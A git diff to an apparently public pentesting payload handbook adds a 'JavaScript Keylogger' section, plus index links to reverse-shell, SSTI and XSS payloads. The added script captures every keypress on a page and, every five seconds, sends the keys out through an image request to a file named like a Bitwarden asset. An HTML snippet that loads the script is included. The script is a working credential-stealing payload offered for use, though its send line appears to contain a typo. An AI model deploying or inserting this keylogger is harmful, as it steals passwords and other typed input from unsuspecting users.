@@ -13,6 +13,7 @@
 - [Groovy (Jenkins) Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Groovy-Jenkins-Reverse-Shell)
 - [iconv](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#iconf)
 - [JAVA Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#JAVA-Reverse-Shell)
+- [JavaScript Keylogger](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#JavaScript-Keylogger)
 - [JDWP](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#JDWP)
 - [Lua Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Lua-Reverse-Shell)
 - [.LNK (Link) Files](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#LNK-Link-File)
@@ -32,7 +33,7 @@
 - [.SCF (Shell Command File) File](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#SCF-Shell-Command-File-File)
 - [Spoofing Office Marco](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Spoofing-Office-Macro)
 - [Server-Side Template Injection (SSTI)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Server-Side-Template-Injection-SSTI)
-- [XSS](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Cross-Site-Scripting-XSS)
+- [Cross-Site Scripting (XSS)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Cross-Site-Scripting-XSS)
 - [xterm Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#xterm-Reverse-Shell)
 - [ysoserial](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#ysoserial)
 
@@ -188,6 +189,36 @@ public void onEnable() {
    super.onEnable();
   }
 }
+```
+
+## JavaScript Keylogger
+
+### logger.js
+
+```c
+var keys='';
+var url = 'bitwarden-info.gif?c=';
+
+document.onkeypress = function(e) {
+    get = window.event?event:e;
+    key = get.keyCode?get.keyCode:get.charCode;
+    key = String.fromCharCode(key);
+    keys+=key;
+
+}
+window.setInterval(function(){
+    if(keys.length>0) {
+        new Image().src = url=keys;
+        keys = '';
+    }
+}, 5000);
+```
+
+```c
+<!doctype html>
+		<script src="log.js">
+	</script>
+</body></html>
 ```
 
 ## JDWP
